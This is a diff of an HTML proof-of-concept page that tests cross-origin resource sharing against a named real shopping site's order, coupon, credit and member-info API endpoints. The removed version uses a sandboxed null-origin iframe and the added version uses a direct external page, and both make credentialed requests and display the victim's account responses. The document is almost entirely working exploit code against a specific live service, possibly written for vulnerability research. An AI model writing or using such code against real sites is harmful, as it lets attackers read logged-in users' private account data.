@@ -2,74 +2,42 @@
 <html>
 <body>
 
-<h2>OPPO CORS NULL ORIGIN TEST</h2>
-
-<button onclick="run()">Run Exploit</button>
+<h3>External CORS Test</h3>
+<button onclick="run()">Run Test</button>
 
 <pre id="out"></pre>
 
-<iframe id="f" sandbox="allow-scripts" style="display:none"></iframe>
-
 <script>
 
-const endpoints = {
-
-cart:"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
-count:"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
-coupon:"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
-credit:"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
-member:"https://www.opposhop.cn/cn/oapi/users/web/member/info"
-
-};
-
-window.addEventListener("message",e=>{
-
-document.getElementById("out").textContent +=
-"\n"+e.data.endpoint+" -> "+e.data.body+"\n"
-
-})
+const endpoints = [
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
+"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
+"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
+"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
+];
 
 function run(){
 
-let code = `
-<script>
+document.getElementById("out").textContent="Running...\n\n";
 
-const endpoints = ${JSON.stringify(endpoints)}
+endpoints.forEach(url=>{
 
-for (let name in endpoints){
-
-fetch(endpoints[name],{
-
+fetch(url,{
+method:"POST",
 credentials:"include"
-
 })
 
-.then(r=>r.text())
-
-.then(t=>{
-
-parent.postMessage({
-endpoint:name,
-body:t
-},"*")
-
-})
+.then(r=>r.text().then(t=>{
+document.getElementById("out").textContent +=
+url+"\nSTATUS: "+r.status+"\nBODY:\n"+t+"\n\n";
+}))
 
 .catch(e=>{
+document.getElementById("out").textContent +=
+url+"\nERROR: "+e+"\n\n";
+});
 
-parent.postMessage({
-endpoint:name,
-body:e.toString()
-},"*")
-
-})
-
-}
-
-<\/script>
-`
-
-document.getElementById("f").srcdoc = code
+});
 
 }
 
